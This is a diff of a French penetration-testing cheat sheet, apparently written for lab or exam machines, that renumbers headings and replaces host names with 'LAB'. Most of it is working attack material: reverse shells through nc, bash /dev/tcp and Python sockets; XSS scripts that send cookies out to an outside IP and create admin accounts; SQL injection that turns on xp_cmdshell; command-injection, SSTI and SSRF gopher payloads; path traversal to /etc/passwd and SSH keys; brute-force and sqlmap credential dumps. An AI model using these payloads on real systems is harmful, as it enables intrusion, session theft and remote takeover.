@@ -1,59 +1,63 @@
+# Payloads
+
 ```bash
-# payload universel : SQLi (`'"`), XSS (`<img>`), SSTI (`{{7*7}}`), EL injection (`${7*7}`), Command injection (`sleep 5`)
+# payload universel : 
+# SQLi (`'"`), XSS (`<img>`), SSTI (`{{7*7}}`), EL injection (`${7*7}`), 
+# Command injection (`sleep 5`)
 '"><img src=x>{{7*7}}${7*7};sleep 5
 ```
-# 1. <span style="color:purple;">Commandes </span>
+## 1. Commandes
 
-## Nmap
+### 1.1 Nmap
 ```bash
-nmap asio
+nmap LAB
 ```
 ```bash
-sudo nmap -O -Pn asio
-sudo nmap -sV -O -Pn bambi
-sudo nmap -A bubo
-nmap -A -sC -T4 -n -Pn -p 22,80,111 mentor
+sudo nmap -O -Pn LAB
+sudo nmap -sV -O -Pn LAB
+sudo nmap -A LAB
+nmap -A -sC -T4 -n -Pn -p 22,80,111 LAB
 ```
-## gobuster
+### 1.2 gobuster
 ```bash
-gobuster dir -u http://asio -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://LAB -w /usr/share/wordlists/dirb/common.txt
 
-gobuster dir -u http://bubo -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+gobuster dir -u http://LAB -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 
-gobuster dir -u http://jubula -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt 
+gobuster dir -u http://LAB -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt 
 
-gobuster dir -u http://jubula/templates -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php,txt
+gobuster dir -u http://LAB/templates -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php,txt
 ```
 
-## curl
+### 1.3 curl
 ```bash
-curl http://asio/specials?menu=../config/application.properties
+curl http://LAB/specials?menu=../config/application.properties
 
-curl -I http://fullmoon 
+curl -I http://LAB 
 ```
 
-## hakrawler
+### 1.4 hakrawler
 ```bash
-echo "http://bambi" | hakrawler -u -proxy http://127.0.0.1:8080
+echo "http://LAB" | hakrawler -u -proxy http://127.0.0.1:8080
 ```
 
-## fuzz
-### wfuzz
+### 1.5 fuzz
+#### 1.5.1 wfuzz
 ```bash
-wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
+wfuzz -w paths.txt -w files.txt --hh 0 http://LAB/specials?menu=FUZZFUZ2Z
 
-wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=A4FEDA579BCDFEF6277F6BA336361466 -d "" "http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
+wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=A4FEDA579BCDFEF6277F6BA336361466 -d "" "http://LAB/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
 
 
-wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404,403 "http://bubo/scientific/repository/data/FUZZ.pdf"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404,403 "http://LAB/scientific/repository/data/FUZZ.pdf"
 
 ```
 
-### ffuf
+#### 1.5.2 ffuf
 ```bash
 ffuf -w users.txt:FUZZUSER -w customList.txt:FUZZPASS \
   -fs 4835 \
-  -u http://bambi/dev/index.php \
+  -u http://LAB/dev/index.php \
   -X POST \
   -d 'username=FUZZUSER&password=FUZZPASS' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
@@ -62,30 +66,30 @@ ffuf -w users.txt:FUZZUSER -w customList.txt:FUZZPASS \
   
 ffuf -w users.txt:FUZZUSER -w customList.txt:FUZZPASS \
 -fs 4835,4895,4897,4898 \
--u http://bambi/dev/index.php \
+-u http://LAB/dev/index.php \
 -X POST \
 -d 'username=FUZZUSER&password=FUZZPASS' \
 -H 'Content-Type: application/x-www-form-urlencoded' \
 -H 'Cookie: PHPSESSID=7cd8f9dd18b031e375b5aba7b9c7b427'
 
 
-ffuf -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -X GET -u "http://bubo/scientific/repository/data/FUZZ"
+ffuf -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -X GET -u "http://LAB/scientific/repository/data/FUZZ"
 ```
 
-## cewl
+### 1.6 cewl
 ```bash
 cewl -w customList.txt --lowercase -m 5 --with-numbers -v http://bambi
 ```
 
-## dirb
+### 1.7 dirb
 ```bash
-dirb http://fullmoon
+dirb http://LAB
 ```
 
 ---
-# 2. <span style="color:teal;">Fichiers créés</span>
+## 2. Fichiers créés
 
-### wordlists
+### 2.1 wordlists
 ``` bash
 # paths.txt
 ../
@@ -115,7 +119,7 @@ newsletter_subscription
 newsletter_subscriptions
 ```
 
-### shells
+### 2.2 shells
 
 ```java
 // RevShell.java
@@ -141,7 +145,7 @@ class RevShell {
 /bin/nc -nv ATTACKER-IP 9090 -e /bin/bash
 ```
 
-### XSS
+### 2.3 XSS
 ```javascript
 let cookies = document.cookie;
 fetch("http://192.168.45.230/exfil?data="+encodeURIComponent(cookies));
@@ -168,7 +172,7 @@ xhttp.send();
 ```
 
 ---
-# 3. Wordlists utilisées
+## 3. Wordlists utilisées
 
 ```bash
 # gobuster 
@@ -184,21 +188,21 @@ xhttp.send();
 ```
 
 ----
-# 4. Serveurs
-## Python
+## 4. Serveurs
+### 4.1 Python
 ```bash
 python3 -m http.server 80
 ```
 
-## netcat
+### 4.2 netcat
 ```bash
 sudo nc -lvnp 4444
 ```
 
 ---
-# 5. <span style="color:orange;">Payloads</span>
+## 5. Payloads
 
-## 5.1 SQL
+### 5.1 SQL
 ```sql
 1004;SELECT @@VERSION;
 1004;SELECT+@@VERSION;
@@ -217,7 +221,7 @@ EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
 ```
 
 
-## 5.2 injection dans paramètre
+### 5.2 injection dans paramètre
 
 ```bash
 /var/www; whoami
@@ -230,8 +234,8 @@ EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
 %2Fvar%2Fwww%2F%;%20/bin/nc%20-nv%20192.168.45.230%209090%20-e%20/bin/bash
 ```
 
-## 5.3 XSS
-### files
+### 5.3 XSS
+#### files
 ```javascript
 // xss2.js
 let cookies = document.cookie;
@@ -277,7 +281,7 @@ var creds = 'email=mail2@mail.fr&password=password&name=pouet&username=pouet';
 xhttp.open("GET", "/admin/users/add?" + creds, true);
 xhttp.send();
 ```
-### injection
+#### injection
 ``` html
 <script src="http://192.168.45.230/xss-html.js"></script>
 ```
@@ -285,7 +289,7 @@ xhttp.send();
 ```bash
 <script src='http://192.168.45.204/mentor.js'></script>
 ```
-## 5.4SSRF
+### 5.4SSRF
 ```bash
 sudo service apache2 restart 
 sudo tail -f /var/log/apache2/access.log
@@ -299,7 +303,7 @@ http%3a//192.168.45.204/test
 http%3a//127.0.0.1/api
 ```
 
-### Gopher
+#### Gopher
 ```bash
 python3 GopherGun.py 
 
@@ -317,8 +321,8 @@ username=admin&password=password
 ## payload :
 gopher%3A//localhost%3A80/_POST%2520%252Fapi%252Fadmin%252Fcreate%2520HTTP%252F1.1%250D%250AHost%253A%2520localhost%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%253Bcharset%253DUTF-8%250D%250AContent-Length%253A%252032%250D%250A%250D%250Ausername%253Dadmin%2526password%253Dpassword
 ```
-## 5.5 SSTI
-### ejs
+### 5.5 SSTI
+#### ejs
 ```javascript
 # payloads de test
 {{ 7*7 }}
@@ -334,7 +338,7 @@ ${7*7}
 <%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('cd /root && ls').toString() %>
 ```
 
-### mako (python)
+#### mako (python)
 ```bash
 ${self.module.cache.util.os.popen("find / -name local.txt 2>/dev/null").read()} 
 
@@ -348,7 +352,7 @@ ${self.module.cache.util.os.popen("cat /app/proof.txt").read()}
 <% import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.228",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); %>
 ```
 
-## 5.6 Shells
+### 5.6 Shells
 ```bash
 # PAYLOAD
 bash -c 'bash -i >& /dev/tcp/192.168.45.217/9090 0>&1'
@@ -356,7 +360,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.45.217/9090 0>&1'
 nc -nlvp 9090
 ```
 
-# 6. Directory traversal
+## 6. Directory traversal
 
 ```
 <!DOCTYPE data [
@@ -385,7 +389,7 @@ http://piano/siteadmin/dev?piano_f=../../../../../../etc/passwd
 ../../home/admin/.ssh/id_rsa
 ```
 
-# 7. SQLi
+## 7. SQLi
 ### SQLMap
 https://labex.io/tutorials/kali-gain-an-interactive-os-shell-with-sqlmap-594139
 https://github.com/sqlmapproject/sqlmap/wiki/usage
@@ -457,7 +461,7 @@ sqlmap -r login.txt --batch -D piano_protocol -T users --columns
 sqlmap -r login.txt --batch -D piano_protocol -T users -C email,firstname,id,lastname,password,username --dump
 ```
 
-# 8. ssh
+## 8. ssh
 
 ```bash
 # créer fichier contenant clef ssh copiée
